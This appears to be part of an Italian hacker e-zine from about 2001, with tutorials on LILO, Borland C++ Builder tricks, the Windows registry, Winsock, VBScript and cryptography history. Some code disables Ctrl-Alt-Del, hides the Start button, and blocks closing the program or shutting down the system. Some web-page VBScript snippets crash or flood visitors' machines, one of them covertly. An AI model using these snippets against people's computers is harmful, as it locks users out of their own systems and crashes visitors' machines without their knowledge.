si Linux starete leggendo questo tutozz e spaccandovi di risate lo so, ma andiamo
avanti, se questo benedetto LILO è invece installato nella partizione root, in questo
caso le cose diventano molto + semplici, xkè basta avviare quella specie di Fdisk
tipo quello di winzozz e rimuovere le partizioni di Linux, bhè sinceramente spero
ke Linux rimanga sempre nel Vs pc xkè è un bel sistemimo, eheheh, vabbè nn facciamo
/pub, ;), ricordatevi dopo tutto sta menata di riattivare la partizione DOS
(bootable).
------------------------------------------------------------------------------------
Un'ultima cosa prima di kiudere è questa volevo dirvi come avviare Linux con un
disketto, per qualsiasi problema, certo prima di tutto dovrete creare un disketto
con LILO dentro e come, anke questo lo trovate nella guida esplicativa all'interno
dei CD di LINUX:
fdformat /dev/fd0H1440 -----------> :))) formattiamo il floppyno e scriviamo le
traccie
mkfs -t minix /dev/fd01440 -------> classico filesystem dii tipo minix
ok, in alcuni sistemi c'è già un comando per fare tutto questo ma per voi smanettoni
potete anche provare.........
------------------------------------------------------------------------------------
Prometto di Tornare sul LILO con alcune spegazioni molto + dettagliate e esaurienti..
ma per il momento accontentatevi.. ;))

SALUTI: alla crew, al chan #NoFlyZone in particolare a /\ LordVicio /\/\LoNeWoLfDeN /\
/\ /\/\Cristian84 /\/\  BigaLex /\/\ _1/2Matto /\/\ [D]kl /\/\ R|ppy /\
/\ CityHunter /\/\ e tutto il resto della CREW

					********** www.noflyzone-crew.cjb.net **********
				********** irc: irc.azzurra.it 6667 #NoFlyZone **********
					 _____________________________________
					[                                     ]
					[          Copyright (C) 2001         ]
					[                                     ]
					[    Crashes  - rocket@freemail.it    ]
					[_____________________________________]



------------------------------------*END*--------------------------------------

------------------------------------[31]---------------------------------------
----------------------------------[[V]lad]-------------------------------------
-----------------------------[C++ Trics & tips]--------------------------------

                         
Introduzione:

A mio modesto parere il Borland C++ Builder è un ottimo ambiente di sviluppo in quanto assembla
due qualità veramente fantastiche: la velocità di esecuzione dei programmi (nonchè 
ottimizzazione del codice) e la semplicità di sviluppo....esso infatti è un ambiente RAD....come
il VisualBasic per capirci.... che come metodo di programmazione è criticato da molti.... ma a 
me piace! Non darà le soddisfazioni della programmazione a basso livello ma sicuramente neanche
le nottate passate a studiare le documentazioni delle API. E' inutile comunque dire che per un
buon coder la programmazione a basso livello è indispensabile(non che non si possa fare
programmazione a basso livello in borland c++ builder....) quindi
DOVETE imparare anche le API(magari nel prossimo tut:). Iniziamo quindi con il tutorial....

Parte Prima ---- Introduzione(si...ma è l'ultima giuro) sul Borland C++ Builder

Personalmente utilizzo la versione 5.0 Entrprise e devo dire che è ricchissima di componenti...
Per compilare i nostri listati cmq dovrebbe bastare la versione che trovate facilmente sulle 
riviste tipo IoProgrammo...
Installate il programma e create un nuovo progetto !File->NewApplecation!. Spero che abbiate
familiarità con gli ambienti RAD....se non è così imparerete sicuramente in un attimo....(modo
come un'altro per non spiegare una parte pallosa... lo ammetto^_^)

Iniziamo con i tricks.....
Per provarli vi consiglio di creare una serie di bottoni sul Form e inserire il codice che
analizzeremo nell'evento OnClick del bottone che avete creato.... in questo modo avremmo un 
progetto che racchiude tutti i tricks pronti per essere consultati in caso di bisogno :)

Allora..... quale potrebbe essere il primo "trucchetto"??? Per esempio potreste voler creare
un Form in modo dinamico..... questa è una cosa molto utile.... e semplice:

<---------------------------------------------------------------------------
TForm *Form; //Come potete vedere occorre creare un puntatore a TForm
Form = new TForm(this); //creiamo il Form
Form->Parent =this; //ce lo teniamo stretto al form padre
Form->Show(); //E lo mostriamo all'utente
<----------------------------------------------------------------------------

oppure risalire alla data dell'ultima modifica di un file:
<---------------------------------------------------------------------------------------
int fHandle;
AnsiString s; //Dichiariamo le nostre variabili
fHandle=FileOpen("c:\\nomefile.txt",0); //Apriamo il file che ci interessa
s=DateTimeToStr(FileDateToDateTime(FileGetDate(fHandle))); //Prendiamo la data di modifica
Label1->Caption=s; //E scriviamola su una label
FileClose(fHandle); //Ora non ci resta che chiudere il nostro file
<-------------------------------------------------------------------------------------

Già.... bazzeccole direte voi..... ma sapete forse disabilitare la combinazione CTRL-ALT-CANC??
Si?????? Bhè io la metto lo stesso che non si sa mai....
<----------------------------------------------------------------------------------
//Per fare questo però occorre far credere a winpuzz che stiamo eseguendo uno screen-saver....
MOUSEKEYS mk;
SystemParametersInfo(SPI_SCREENSAVERRUNNING,TRUE,&mk,0); //Facile no??

//Per ritornare alla condizione normale

MOUSEKEYS mk;
SystemParametersInfo(SPI_SCREENSAVERRUNNING,FALSE,&mk,0);
<----------------------------------------------------------------------------------

Volete poi nascondere il vostro programma dalla barra degli strumenti????
<----------------------------------------------------------------------------
ShowWindow(Application->Handle,SW_HIDE); //Ecco qui come fare 
ShowWindow(Application->Handle,SW_SHOW); //e qusro per farla riapparire!
<----------------------------------------------------------------------------

Che ne direste di IMPEDIRE(mhuhahahahahaha) all'utente di chiudere il vostro
programmino malefico??? Dovete eseguire questa funzione nell'evento OnCloseQuery del form...
<----------------------------------------------------------------------------
void __fastcall TForm1::FormCloseQuery(TObject *Sender, bool &CanClose) 
                     
    CanClose=false; //Questo impedisce la chiusura
    ShowMessage("E così vorresti uscire eh???? AHAHAHAHA"); // e questo sfotte
                                                            //(siamo proprio monelli)
<----------------------------------------------------------------------------

Ci state prendendo gusto??? Vi siete stancati della forma rettangolare dei form?? Preferite
un'ellissi?
<--------------------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
: TForm(Owner)
{
	RECT R = GetClientRect();
	HRGN MyRgn = CreateEllipticRgn(0, 0, R.right, R.bottom); //Questo crea la forma
	SetWindowRgn(Handle, MyRgn, true);// E così la mostriamo
}
<--------------------------------------------------------------------------------------

Questa è proprio bastarda!! Nascondere il pulsante Star/Avvio Muhahahahaha
<-------------------------------------------------------------------------------------------

HWND TaskBarHandle,ChildWindowHandle;
char WindowClass[256];//Creiamo Handle
TaskBarHandle=FindWindow("Shell_TrayWnd",NULL); Handle->TaskBar
	if(TaskBarHandle)
	{

		ChildWindowHandle=GetWindow(TaskBarHandle,GW_CHILD);
		while (ChildWindowHandle)
		{

		GetClassName(ChildWindowHandle,WindowClass,255);
		if(!strcmp(WindowClass,"Button"))
		ShowWindow(ChildWindowHandle,SW_HIDE);//Con questo nascondiamo il bottoncino
		ChildWindowHandle=GetWindow(ChildWindowHandle,GW_HWNDNEXT);

		}

	}

<---------------------------------------------------------------------------------------------

Reperire il nome dela diredtory di esecuzione del programma può sempre fare comodo...
<--------------------------------------------------------------------------------------------
char Dir[256];//Semplice vettore di caratteri
GetCurrentDirectory(256,Dir);//Funzioncina fighetta
Label5->Caption=Dir;//Che ne dite di mettere la directory in una label?
<--------------------------------------------------------------------------------------------

Anche suonare un waw non è inutile
<--------------------------------------------------------------------------------------------
#include <win32\mmsystem.hpp> //ci serve però questo bell'include
SndPlaySound("file.wav", SNDW_SHOWNORMAL); //e chiamare questa funzione! 
<--------------------------------------------------------------------------------------------

E cosa ne pensate di catturare il desktop e metterlo nel canvas del form?
<--------------------------------------------------------------------------------------------
HDC DeskTopDC;
TCanvas *DeskTopCanvas = new TCanvas;
TRect DeskTopRect;
DeskTopDC = GetWindowDC (GetDesktopWindow() ); DeskTopCanvas->Handle = DeskTopDC;
DeskTopRect = Rect ( 0,0, Screen->Width,Screen->Height );
Form1->Canvas->CopyRect ( DeskTopRect, DeskTopCanvas, DeskTopRect );
delete DeskTopCanvas; 
<--------------------------------------------------------------------------------------------

Terminiamo il tutorial con un tocco di classe(bhè insomma...): Impedire all'utente di chiudere
il sistema(e sfotterlo pure) 
<---------------------------------------------------------------------------------------------
void __fastcall WMQueryEndSession(TWMQueryEndSession &msg); //aggiungete questo in private 
                                                            //nell'header
//E questa macro in public(per capire a cosa serve provate a non metterla:-)
BEGIN_MESSAGE_MAP
	MESSAGE_HANDLER(WM_QUERYENDSESSION,TWMQueryEndSession,WMQueryEndSession)
END_MESSAGE_MAP(TForm)

//ora aggiungete nel .cpp principale....
void __fastcall TForm1::WMQueryEndSession(TWMQueryEndSeission &msg)
{
	msg.Result = 0;
	ShowMessagge("Nononononono.... tu resti qui bello");
}
<---------------------------------------------------------------------------------------------

Bhè che dire?....io mi sono divertito a fare sto tut....e magari ne farò altri sull'argomento!!
Saluti alla #NoFlyZone e a te che sei arrivato fino alla fine del tute!

Per qualsiasi domanda chiarimento ecc... irc.azzurra.it #NoFlyZone [V]lad




------------------------------------*END*--------------------------------------



------------------------------------[32]---------------------------------------
-----------------------------------[Evil]--------------------------------------
------------------------------[Registry edit]----------------------------------

        _____________ _____  ____  ______  _____
         ____  ______/ __| | __/ /__/_  _/  _/ /
          __  / __   ____  |  / /  __/ / ___/ /
         __/ _____/     _| |_/ /____/ /____/ /
        __  / ___     ___| |/ / ___/ /_ __/ /_____
       __________/ _________ /  _/____/ _/________/
                                                   .::Registry edit::.
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO
io non mi ritengo responsabile di come utilizzerete le informazioni
contenute in questa guida in quanto da me offerte a puro scopo
informativo!!
insomma in poche parole NON FATE CAZZATE!
OoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoO

questa guida è copyright © di [Evil]
www.evil87.cjb.net


Consumo: 1/2 Confezione di noccioline
         1   Coca-cola
         1   Ovetto kinder (Con dentro una cazzo di balena ROTFL!)

Saluti: NoFlyZone-Crew , Ness1 , Sh1n ,
        BigAlex , Pipp0 , FeltonSpray  , []Lord[V]icio[]

Musica: Sum41 - in too deep , Sum41 - fat lip , Blink182 - stay together for
	the kids ,Greenday - Basket Case , Greenday - Minority

--------------------------
Windows
--------------------------

L'idea di questo tutorial mi è venuta leggendo l'articolo di []Lord[V]icio[]
sulla difesa (nfz n'2).

Oggi è il 05/01/2001 è da poco che ho windows XP , e i miei commenti sono :

1 - Un pò più stabile dei suoi precedenti
2 - Sfrutta troppo e inutilmente la cpu
3 - Il terzo commento è più un'osservazione :

Windows più avanti va come versioni e meno ti fa smanettare, linux invece più
avanti va come versioni e più ci puoi smanettare
4 - Alla fin fine per lavorare io uso win (e non me ne vergogno)... quindi :)
Inoltre Windows è a pagamento (e chi mai a pagato windows? :) al contrario di
linux , come o potuto vedere oggi in edicola a 9.900 lire cè la redhat 7.2 bella
che completa! (non prenderla è da veri coglioni) ma non sono qua per fare critiche
ma bensì per farvi conoscere più a fondo windows

~~>Registro di sistema

Regedit : questo comando fatto partire da dos , o da start/esegui visualizza il
registro di sistema
Il registro di sistema è la chiave di tutto , da li puoi fare di tutto e di più ,
purtroppo non quello che potresti fare con linux , ma ci si avvicina .
da qui potete cambiare nome al cestino, cambiare icone, menù, modificare modi di
apertura di file, aggiungere nuovi nomi di file, persino crackare programmi e
ancora molto altro , ma per fare capire anche ai principianti farò esempi pratici.
(Se non funziona provate "regedt32.exe"

~>Hkey_Classes_Root

Questa chiave appena si espande mostra svariate cartelle che con un pò di intuito
potrete capire che sono le estensioni dei file e i rispettivi accessi via explorer
e alcune cartelle riguardanti il class identification (OLE) , per ole si intende il
menù che viene mostrato quando noi clicchiamo (per es.) con il tasto destro del
mouse sul desktop , quindi voci e azioni delle oledrop.
Se noi vogliamo creare una estensione personalizzata dobbiamo tenere conto di alcune
regole.

1 - nome
2 - directory e subdirectory
3 - stringa di apertura
4 - nome estensione

quindi aggiungiamo una chiave ad hkey_classes_root cliccando con il destro
nuovo/chiave e chiamiamola "Evil_file" , dopo aggiungiamo una chiave in "Evil_file"
chiamata "shell" e un'altra sotto "shell" chiamata "Open with Evil" e un'altra sotto
 "open with evil" chiamata "command" in quest'ultima dobbiamo cliccare due volte
 sulla stringa "(predefinito)" e assegnarne il valore c:\windows\notepad.exe "%1"
 dopo aggiungiamo una chiave ad "Hkey_Classes_Root" chiamandola ".EVIL" e nella
 stringa "(predefinito)" assegnamo il valore "Evil_file" diamo l'ok e proviamo a
 creare sul desktop un nuovo file di testo chiamato "Helloworld.EVIL" clicchiamoci
 con il destro e vedremo in alto la scritta in grassetto "Open with Evil" , ora
 questo è un pò inutile però potrebbe servire a programmatori che hanno fatto
 programmi per la gestione di immagini , musica ecc...
insomma questa è la gestione dei file , delle estensioni e delle ole drop di windows,
sembrava più difficile vero?
una cosa che ancora non ho capito e penso che ben pochi lo hanno capito , è il
significato delle chiavi ClSid , se ve ne intendete vi prego di mailarmi.
ma vediamo una voce che sicuramente vi ha attirato molto , ovvero la voce "*" questa
è la voce che riguarda ogni file indipendentemente dall'estensione e dal nome ,
spesso programmi come winzip , zipzilla , winamp , winrar ecc.. influiscono su
questa chiave e a volte può risultare utile ripulirla.
* per clsid si intende Class Identification

Attenzione!

1 - evitare di modificare i contenuti della chiave ClSid
2 - non toccate nulla di quello che non conosciete
3 - evitare di creare copie di estensioni di file
4 - prima di intervenire sul registro di sistema fatene un backup (spiegato più a
    fondo)

Trucco di fine paragrafo :

Per cambiare il nome del cestino dovrete intervenire sul ClsId (Class Identification)
ma niente di pericoloso , aprite il regedit e nel menù Modifica->Trova inserite come
nome 645FF040-5081-101B-9F08-00AA002F954E , questo è il cestino , sulla destra
trovate una stringa "predefinito" cliccateci due volte sopra e cambiate il valore da
cestino in quello che volete voi

~>Hkey_Local_Machine

Questa chiave di registro è quella che contiene le informazioni su hardware/software ,
 configurazioni che coinvolgono tutti gli utenti , questa chiave e composta da sette
  sottochiavi:

1 - Config
2 - Enum
3 - Hardware
4 - Network
5 - Security
6 - Software
7 - System

1.Config

Questa prima sottochiave contiene informazioni sull'hardware e varie impostazioni
(Stampanti , Scanner , Modem , Fonti , Risoluzione ecc...) , ma anche impostazioni
/configurazioni su eventuali connessioni ad internet (Accesso remoto).

2.Enum

Conserva le informazioni/settaggi su tutte le perigeriche installate , (Hard-disk ,
floppy , le lettere delle unità ecc..) , questa chiave ha il pregio di mantenere le
informazioni su hardware installati e in seguito cambiati , per esempio se cambiate
monitor , troverete entrambi in hkey_local_machine/enum/monitors, dove
Default_Monitor vi indicherà il monitor in uso e le sue informazioni (driver creatore
 ecc...).

3.Hardware

Questa chiave contiene informazioni e configurazioni su hardware con comunicazioni
via seriale , settaggi delle porte , nonchè del processore ed i suoi componenti
(recurabili in parte su hardware/description/system/centralprocessor) oltre ad id,
dominio ecc...

4.Software

Software da come si può capire contiene informazioni sui software installati sul
vostro PC , questa chiave è parallela a Hkey_current_user/software , ma contiene
informazioni meno dettagliate sui programmi , una cosa utile può essere ripulire
la chiave HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  , dove
troveremo tutte le applicazioni che vengono avviate all'avvio di windows (scusate
il gioco di parole) in modo da rendere quest'ultimo più rapido

Cheat: Win XP: per cambiare la porta di default di telnet andate alla chiave
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0 cambiate la stringa
TelnetPort , nel codice corrispondente alla porta da voi richiesta per es.
se cambio il valore in 19 la porta sarà la 25 se cambio il valore in 15 la porta
sarà la 21 ecc...

5.Network

Chiave contenente informazioni sulla connessione e la rete locale , come :
protocolli , periferiche plug & play , pci ecc..

6.System

Contiene informazione sui driver, la loro versione ma anche informazioni necessarie
all'avvio, il nome del computer e le impostazioni del file system.

7.Security

Sicurezza per la rete
privacy , cookie , impostazioni lan , proxy ...

~Hkey_Current_User

Questa chiave contiene informazioni sull'utente corrente e sulle impostazioni sulla
personalizzazione del sistema, anche questa contiene numerose sottochiavi, 8 di
preciso , ovvero:

1 - AppEvents
2 - Control Panel
3 - Identities
4 - InstallLocationsMRU
5 - Keyboard layout
6 - Network
7 - Remote Access
8 - Software

1.AppEvents

Contiene informazioni sui suoni da riprodurre per ogni evento di sistema , ad
esempio : Quando cè posta  , quando si verifica un errore , quando si spegne il pc
ecc...

2.Control panel

Control panel ovvero Pannello di controllo !va che nessuno lo sapeva :)! , contiene
informazioni sullo schermo e le proprietà assegnate , sul desktop e i relativi
colori...

3.Identities

Riguarda in genere outlook express e le sue impostazioni (mail , rubrica , news
ecc..)

4.InstallLocationsMRU

Contiene l'elenco delle directory predefinite in caso di installazione driver ,
software , aggiornamenti...

5.Keyboard layout

Contiene informazioni sulla tastiera corrente (in genere italiana "qwerty")

6.Network

Coincide in parte con la chiave "network" di Hkey_local_machine e anche essa
contiene informazioni sulla connessione e rete locale

7.Remote access

Contiene informazioni sulla cartella Accesso Remoto come connessioni , info
sull'utente , configurazioni , profili ecc..

8.Software

Contiene tutte le informazioni sui software insytallati sul nostro sistema ,
quali data di installazione , nome applicazione ed alcune volte informazioni molto
 molto interessanti sull'evaluation period dei freeware (hihihihihi)

~

Come noterete mancano altre chiavi , beh i motivi sono due , il tutorial
diventerebbe troppo lungo e il secondo è che le altre chiavi dipendono più o meno una all'altra , comunque ne cito almeno una piccola  descrizione per una.

~Hkey_Users

Dipende in parte da Hkey_current_user e contiene informazioni su ogni utente e
sulle sue relative impostazioni

~Hkey_current_config

Gemellato con Hkey_Local_Machine contiene informazioni sull'hardware , porte ,
configurazioni ecc..

Infine ci sta un ultima chiave non presente in Windows 2000/XP ovvero...

~Hkey_Dyn_Data

Contine informazioni sulle periferiche plug'n'play presenti sul computer ,
che vengono aggiornate a velocità quasi supersonica anzi "sonica" :) quando ne
vengono installate o rimosse dal sistema

~

E NO , NONO ragazzi non è ancora finita , ora vi beccate ancora il backup del
registry (anche perchè se combinate casini questa è l'unica soluzione "o quasi")
 , vi anticipo già che dopo la pappardella del backup , ci saranno i trucchi di
 fine tutorial HIHIHIHIHIHI >)

~Registry_backup

Scanreg.exe : Un file rozzo per ottenere una soluzione altrettanto rozza
                                   ¿Question?
                    Noi vogliamo una cosa rozza o fatta bene?
              Bene e allora...

Interveniamo sul file scanreg.ini troveremo una riga come questa:

"MaxBackupCopies=5"

Che mai faremo? mhhh quel 5 li è un po poco ma che cosa è?
Il 5 indica il numero di istanze del backup da conservare quindi aumentiamolo! ma
senza esagerare , facciamo 10 - 15 - 20 anche 30 e tutto verrà salvato su
C:\Windows\Sysbackup
Ma se questo non partisse all'avvio in automatico allora il comando manuale è questo:

Scanreg.exe/backup

e per riparare il registry:

Scanreg /restore

se avete effettuato il backup e restore , ma quanlcosa non va ancora , controllate
la validità con

Scanreg.exe/fix

oppure riavviate il computer

~Fine :(

Siamo alla fine del tutorial :( , come avrete notato è molto più lungo dei
precedenti , del resto dopo una pausa così lunga non potevo deludere i lettori!
comunque presto vedrete altri miei tutorial vagare per la rete , sul mio sito ,
sulla e-zine della NFZ , e spero su altri siti (se sei un webmaster butta la
mia guida sul tuo sito! :)
ok ok basta ci si risente

------------------------------------*END*--------------------------------------


===============================================================================
-------------------------------------------------------------------------------
---------------------------[News & Scritti da Voi]-----------------------------
-------------------------------------------------------------------------------
===============================================================================


------------------------------------[33]---------------------------------------
----------------------------------[endsub]-------------------------------------
---------------------------------[Winsock]-------------------------------------




Non ci sono grandi differenze di caratteristiche tra il socket Berkeley e il
Winsock. Le principali sono:

1. Il socket windows implementa l'API del socket in una libreria con
   estensione dll, chiamata winsock.dll.
2. Winsock, oltre alle funzioni già definite con il socket Berkeley,
   richiede sempre la chiamata a due funzioni specifiche: WSAStartup e
   WSACleanup. WSAStartup() è una funzione chiamata dal programma durante una
   negoziazione tra il programma stesso e winsock.dll. Il programma specifica
   le caratteristiche minime richieste al winsock ed il winsock risponde
   specificando le proprie funzionalità. In pratica questa funzione serve al
   programma per specificare quale versione dell'API winsock necessita.
   WSAStartup può essere chiamata diverse volte durante l'attività del
   programma, ad esempio per fornire le caratteristiche dell'implementazione.
   A ogni chiamata viene incrementato un contatore delle chiamate.
   WSACleanup() è una funzione che viene chiamata dal programma per
   decrementare il contatore delle chiamate alla funzione WSAStartup.
3. In un errore nel socket, l'API Berkeley utilizza la funzione errno() con
   il valore a -1, mentre il winsock definisce una nuova costante, chiamata
   Socket_Error, il cui valore è -1; il programma chiamerà quindi la funzione
   WSAGetLastError, che verificherà la causa che ha provocato l'errore nel
   winsock.
4. A differenza di quanto avviene con i programmi unix, che necessitano di
   più file header, nei programmi per Windows l'unico file da includere per
   il supporto dei  socket e' winsock.h sia per la versione a 16 che per
   quella a 32 bit. L'header winsock.h include automaticamente windows.h e,
   pertanto, non sarà necessario inserirlo. In  fase di  compilazione si
   scegliera'

Introduzione vbs

Uno dei fastidiosi problemi creato per facilitare ed abbellire le pagine web è
il linguaggio script.
I maggiori esponenti di questo linguaggio sono il vbs ed il JS alias visual basic
script e java Script. Solitamente lo si può introdurre nelle pagine web, o
inviandolo via mail tramite un client che supporta il linguaggio. Solitamente per
le pagine web lo script vbs come anche il JS va inserito tra

<body>

</body>

presente nella parte del codice Html della pagina.
Il visual basic script ed il javascript hanno più o meno le stesse funzioni, il
vbs può essere giudicato al massimo più semplice in quanto riprende determinati
algoritmi del vb visual basic quindi alcune parti 30% possono sembrare simili o
del tutto uguali, ecco perché è stato chiamato visual basic script, dato che è il
linguaggio script del comune vb standard.
Lintroduzione di uno script vbs si ha dichiarando in primo luogo il linguaggioquindi

<script language=vbs>

in cui viene dichiarato inizialmente il tipo di linguaggio <linguaggio script> ed
inseguito la tipologia dello script, nel nostro caso vbs (visual basic script).
In seguito verrà immessa la parte principale, ossia lo script comandi ed infine
verrà chiuso con listruzione..

</script>

quindi potremo in fine dire che uno script ha questa struttura

<script language=linguaggio>
COMANDI DELLO SCRIPT
</script>

Commenti
I commanti in vbs possono essere inseriti nel medesimo codice seguiti da (), così
facendo il sistema riconosce listruzione preceduta dallapostrofo come commento e
quindi non viene calcolata. Spesso questistruzione viene immessa per spiegare
determinati passaggi una sorta di commento
O magari solo lenunciazione di un copyright.
Il codice va inserito in questa maniera

<script language=linguaggio>
commenti riguardanti lo script
Comandi dello script
</script>


MsgBox

Bene ma quali sono i comandi del linguaggio vbs?, dato che questo è un testo di
iniziazione al linguaggio script citerò solo i più banali se non essenziali.
I comandi primari sono

1) Msgbox
2) Open
3) Do Loop

Esaminiamo ora questi comandi singolarmente e le loro propietà.

Msgbox è il comune pop up ossia il messaggio con lopzione del click min 1, max 3.
Il comando msgbox va inserito in questo modo

Msgbox testo messaggio, TipoMessaggio

Naturalmente inserito allinterno del corpo dello script, quindi se ad esempio
vorremo un messaggio che ci dica semplicemente buongiorno lo script sarà il seguente

<script language=vbs>
msgbox Buongiorno
</script>

in questo caso dato che non abbiamo specificato la proprietà del messaggio di errore,
di domanda, di informazione etc etc, il nostro messaggio sarà un semplice messaggio di notifica.

Se invece decidevamo di dare un messaggio di errore dovevamo inserire la proprietà
del messaggio. Le proprietà fondamentali delle msgbox in vbs sono le seguenti

VbCritical         =  errore
VbYesNo          =  scelta
VbInformation  =  informazione
VbExclamation =  esclamazione

Quindi se volevamo mostrare il messaggio con su scritto buongiorno ma di errore, la
msgbox sarebbe stata

msgbox Buongiorno, VbCritical

Quindi lo script sarebbe stato

<script language=vbs>
msgbox Buongiorno, VbCritical
</script>

E così via per tutte le altre modalità di messaggio.

Funzione Open

La funzione open serve ad aprire determinate directory di sistema, o semplicemente
ad aprire una pagina web.
La funzione va esplicitata in questo modo sia per le directory per far aprire
determinate cartelle che per le pagine web siti, scusate se sembro banale e
scontato ma un articolo completo se pur diniziazione lo deve essere :), il codice
quindi sarà

Open directory, ModalitaVisualizzazione

Quindi se ad esempio vorremo far aprire la cartella c:\programmi non dovremo far
altro che inserire al posto di directory, il percorso della cartella, ed al posto
di ModalitàVisuslizzazione la modalità, quindi il parametro di visualizzazione, se
si desidera farla aprire normalmente a tutto schermo si può anche non inserire la
modalità di visualizzazione.
Quindi per far aprire la cartella c:\programmi, la funzione sarà

<script language=vbs>
Open c:\programmi
</script>

Per far aprire ad esempio la pagina web di nome www.bismark.it dovremo scrivere

<script language=vbs>
Open http://www.bismark.it
</script>

Se invece desideriamo far si che la nostra pagina web o cartella che sia, venga
aperta in maniera minimizzata dobbiamo introdurre la modalità di visualizzazione,
questa proprietà è

VbMinimizedNoFocus

Quindi il codice per far si che venga aperta in maniera minimizzata sarà

 Open http://www.dbeings.it, VbMinimizedNoFocus

Do Loop

Il do loop indica essenzialmente una ripetizione dellistruzione in maniera ciclica
infinita.
Il comando Do loop va inserito con il Do allinizio dellistruzione, ed il Loop alla
fine. Questo comando è simpaticamente utilizzato da quelle persone che io reputo lo
scazzo della rete laMHz dato che questa funzione portando il comando in esecuzione
continua esaurisce le risorse del sistema  creando una sorta di Flood alla ram con
successivo crash della macchina su cui lanciato.
Ma questo concetto lo riprenderemo più in la.
Un esempio di Do loop può essere implicato nelluso delle msgbox, infatti basta
inserire il comando do loop allinizio ed al termine dello script per far si che il
messaggio venga ripetuto allinfinito possibile chiudere solo con ctrl + alt + canc.
Il codice quindi sarà il seguente

<script language=vbs>
Do
 msgbox Buongiorno
Loop
</script>

In questo caso avremo la ripetizione infinita del messaggio buongiorno dato che è
incamerato nella funzione Do Loop
Questa funzione do loop può essere implicata in qualsiasi comando vbs ad esempio
può essere inserita anche nellapertura di una directory o magari come già spiegato
di una pagina web.
Quindi per esempio per aprire allinfinito la cartella c:\ il codice sarà il seguente

<script language=vbs>
Do
 Open c:\
Loop
</script>

che ha il compito di ripetere in maniera ciclica infinita il comando tra le
istruzioni Do e loop, ossia il comandoOpen (c:\).

Il vbs è da molti giudicato anche abbastanza pericoloso a causa di determinate
funzioni dolete inoltre ricordiamo gli innumerevoli virus creati nel medesimo
linguaggio magari con qualche decina di righe in più.
Credo molti ricordino anche il famoso baco c:\con:con del window$ 9x, che provocava
un conflitto tale da rendere per il più delle volte la macchina inutilizzabile, e
fare un reboot brutale per via hard ware, infatti basta un semplicissimo

<script language=vbs>
 Open c:\con:con
</script>

per generare gli stessi effetti, o magari funzioni più complesse come il recente
baco

<script language="vbs">
On Error Resume Next
Dim a
Dim i
For i = 1 To 1000
Set a = CreateObject("Word.Application")
Next
</script>

per generare lesaurimento delle risorse del sistema solo in maniera più occulta,
lasciando lutente ignaro di ciò che stia accadendo teoria che riprende la funzione
da me già pubblicata

Do
Shell Start
Loop

Solo che questultima non appartiene al linguaggio script, ma al comune vb visual
basic infatti anchesso crea una sorta di dos locale con fini simili al baco vbs,
ossia quello di generare un sovraccarico con successiva dissipazione di risorse di
sistema, in modo tale che il pc non posa rispondere più ai comandi generati
dallutente, cercando inutilmente di avviare un file inesistente.

l'articolo termina qui altrimenti non sarebbe più base : )

Un saluto alla NoFlyZone

____________________________________
|Copyright © by    Umberto De Palma|
|           Chat : *C6             |
|      Nickname  : endsub          |
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯

------------------------------------*END*--------------------------------------

------------------------------------[34]---------------------------------------
----------------------------------[[$]wiT]-------------------------------------
--------------------------[Crittografia 4 dummies]-----------------------------



La crittografia ha origini antichissime, infatti il primo esempio di crittografia
scritta risale a circa 6000 anni fa: si tratta di una iscrizione egizia in cui
furono usati geroglifici non standard.
Nell'antichita' si possono trovare innumerevoli altri esempi di tecniche di
crittografia come per esempio il codice impiegato da Giulio Cesare per comunicare
con i suoi generali. Questa chiave di crittografia confrontata a quelle di oggi
risulta molto elementare e quindi inutilizzabile. Il cifrato di Cesare si cifrava
e decifrava sempre con la stessa chiave, questo sistema e' detto simmetrico.
Vorrei subito precisare che la robustezza di una chiave non sta' nella sua
segretezza ma nella sua complessita'.
Nel 1496 un noto architetto, crittologo del tempo invento' un nuovo cifrario, il
quale prevedeva la modifica periodica della chiave usata. Questo sistema non fu
sviluppato molto dal suo inventore, infatti soltanto alcuni anni dopo fu corretto
e rielaborato cosi' da creare una chiave che a quel tempo fu chiamata "le chiffre
indechiffrable" (il cifrario indecifrabile).
Sino alla fine della seconda guerra mondiale non ci furono grossi sviluppi nel
campo della crittografia, ma da questo periodo in poi, con l'avvento dell'
informatica, ci fu un vero e propio bum; furono sviluppati i primi algoritmi adatti
ad essere implementati tramite un calcolatore. Nel 1970 con l'arrivo dei primi
computer l'IBM costrui' un algoritmo per il governo USA, che pensate ha usato sino
al 2000. Il "Des" cosi' fu chiamato questo algoritmo aveva una chiave di 56 bit
(cioe' le chiavi possibili sono 2 alla 56).Anche se questo numero e' grandissimo,
circa 72 milioni di miliardi, nel 1998 fu inventato un elaborato che riusciva a
decifrare messaggi DES nell'arco di 60 ore circa (per questo motivo furono buttati
circa 250.000 $).Questa cifra non e' sicuramente bassa, ma alla portata di alcune
societa private e governative interessate a scoprire i segreti di un concorrente.....
Fortunatamente pero', in questi anni le chiavi minime sono a 128 bit.
Tutti i sistemi finora decritti hanno una parte che li accomuna usano al stessa
chiave sia per cifrare sia per decifrare. Cio' non rappresenta un grosso problema
quando i dati non devono andare da nessuna parte, ma se quello che si vuole cifrare
deve essere spedito, allora il problema si fa serio infatti il messaggio potrebbe
essere manomesso e quindi risultare al destinatario illeggibile.
E' qui che interviene la cifratura "assimmetrica", introdotta nel 1975, cosa che ha
rivoluzionato totalmente la crittografia mondiale questo tipo di chiave prevede
l'uso di chiave diverse in modo tale che sia impossibile ricavare l'una dall'altra.
Una delle chiavi, detta pubblica, viene usata per cifrare; l'altra chiave, che
rimane segreta e si chiama privata, viene usata per decifrare. La prima puo' dunque
essere comunicata a tutto il mondo senza nessun tipo di preoccupazione infatti
permette solo la cifratura. Preciso che la crittografia a chiave pubblica non si
limita a risolvere il problema della segretezza infatti, immaginate ad esempio di
ricevere un messaggio urgente da un vostro caro amico che vi comunica la password
del sito che state facendo insieme. Probabilmente volete sapere subito se l'autore
del messaggio e' proprio il vostro amico o e' un lamer [ :) ]! Anche se siete
sicuri che e' il vostro amico chi vi dice che il messaggio non sia stato modificato
da qualche lamer durante la transizione??? Questi 2 problemi sono detti
